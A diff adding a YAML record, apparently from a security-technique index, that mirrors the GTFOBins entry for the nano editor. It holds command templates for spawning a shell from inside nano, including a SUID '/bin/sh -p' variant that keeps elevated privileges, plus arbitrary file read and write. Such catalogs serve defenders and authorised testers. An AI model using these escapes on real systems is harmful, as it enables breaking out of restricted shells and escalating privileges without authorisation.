@@ -1,0 +1,125 @@
+id: gtfobins/nano/shell/unprivileged
+type: binary
+platform: linux
+name: nano
+phases:
+- execution
+capabilities:
+- shell
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+aliases:
+- pico
+commands:
+- template: 'nano
+
+    ^R^X
+
+    reset; sh 1>&0 2>&0'
+- template: 'nano -s /bin/sh
+
+    /bin/sh
+
+    ^T^T'
+  comment: The `SPELL` environment variable can be used in place of the `-s` option if the command line
+    cannot be changed.
+references:
+- https://gtfobins.github.io/gtfobins/nano/
+- https://gtfobins.github.io/gtfobins/pico/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        nano:
+          functions:
+            file-read:
+            - binary: false
+              code: nano /path/to/input-file
+              comment: The file content is displayed in the terminal interface.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            file-write:
+            - code: 'nano /path/to/output-file
+
+                DATA
+
+                ^O'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            shell:
+            - code: 'nano
+
+                ^R^X
+
+                reset; sh 1>&0 2>&0'
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            - code: 'nano -s /bin/sh
+
+                /bin/sh
+
+                ^T^T'
+              comment: The `SPELL` environment variable can be used in place of the `-s` option if the
+                command line cannot be changed.
+              contexts:
+                sudo: null
+                suid:
+                  code: 'nano -s ''/bin/sh -p''
+
+                    /bin/sh -p
+
+                    ^T^T'
+                  shell: false
+                unprivileged: null
+        pico:
+          alias: nano
+    upstream_url: https://gtfobins.github.io/gtfobins/nano/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: shell
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:1b12741f043c2ee28d5a72d7da35f18d8efce6afb934e1216cca2d9bd56c5e1e
